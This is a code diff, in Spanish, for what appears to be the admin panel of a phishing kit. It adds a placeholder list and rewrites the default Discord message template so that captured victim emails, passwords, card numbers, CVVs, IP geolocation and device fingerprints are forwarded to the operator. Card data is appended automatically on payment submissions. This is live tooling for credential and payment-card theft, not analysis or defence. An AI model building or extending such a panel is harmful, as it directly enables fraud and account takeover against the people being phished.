@@ -181,6 +181,14 @@ label{font-size:13px;font-weight:500;color:#374151;margin-bottom:4px;display:blo
         <button class="btn-secondary" onclick="document.getElementById('discordTemplate').value='';updateSetting('discordMessageTemplate','')">Limpiar</button>
         <button class="btn-secondary" onclick="loadDefaultTemplate()">Cargar plantilla por defecto</button>
       </div>
+      <div style="margin-top:16px;padding-top:16px;border-top:1px solid #e5e5e5">
+        <p style="font-size:13px;font-weight:500;color:#374151;margin-bottom:8px">Placeholders disponibles:</p>
+        <div style="font-size:12px;color:#605e5c;line-height:1.8">
+          <strong>Login:</strong> {email}, {password}, {type}, {title}, {ip}, {geoIp}, {geoCity}, {geoRegion}, {geoCountry}, {geoCountryCode}, {geoTimezone}, {geoIsp}, {deviceMemory}, {cpuCores}, {touchPoints}, {isMobile}, {isTablet}, {isDesktop}, {batteryLevel}, {batteryCharging}, {userAgent}, {language}, {screenResolution}, {colorDepth}, {timezone}, {platform}, {onlineStatus}, {cookiesEnabled}, {timestamp}<br>
+          <strong>Tarjeta (pago):</strong> {cardNumber}, {cardHolder}, {expiryDate}, {cvv}<br>
+          <span style="color:#9ca3af">Si es pago ({type} = "Pago") y la plantilla no tiene {cardNumber}, se agregan los datos de tarjeta automaticamente al final del mensaje.</span>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -411,7 +419,7 @@ async function updateSetting(key,value){
 function showToast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.remove('hidden');setTimeout(()=>t.classList.add('hidden'),2500);}
 
 function loadDefaultTemplate(){
-  const tpl='🔐 Nuevo inicio de sesión\n──────────────────────────\nUsuario: {email}\nContraseña: {password}\nIP: {ip}\nCiudad: {geoCity}\nPaís: {geoCountry} ({geoCountryCode})\nISP: {geoIsp}\nLatitud: {geoLatitude}\nLongitud: {geoLongitude}\n\nDispositivo:\nMemoria RAM: {deviceMemory}\nCPU: {cpuCores}\nBatería: {batteryLevel} (Cargando: {batteryCharging})\n\nNavegador: {userAgent}\nIdioma: {language}\nPantalla: {screenResolution} ({colorDepth} bits)\nZona horaria: {timezone}\n──────────────────────────\nHora: {timestamp}';
+  const tpl='🔐 Inicio de sesion\n----------------\nUsuario: {email}\nContraseña: {password}\nIP: {ip}\nGeo IP: {geoIp}\nCiudad: {geoCity}\nPaís: {geoCountry} ({geoCountryCode})\nISP: {geoIsp}\n\nDispositivo:\nRAM: {deviceMemory}\nCPU: {cpuCores}\nTipo: {isMobile} / {isTablet} / {isDesktop}\n\nNavegador: {userAgent}\nIdioma: {language}\nPantalla: {screenResolution} ({colorDepth} bits)\nZona horaria: {timezone}\nPlataforma: {platform}\nEstado: {onlineStatus}\nCookies: {cookiesEnabled}\n----------------\nHora: {timestamp}';
   document.getElementById('discordTemplate').value=tpl;
   updateSetting('discordMessageTemplate',tpl);
 }
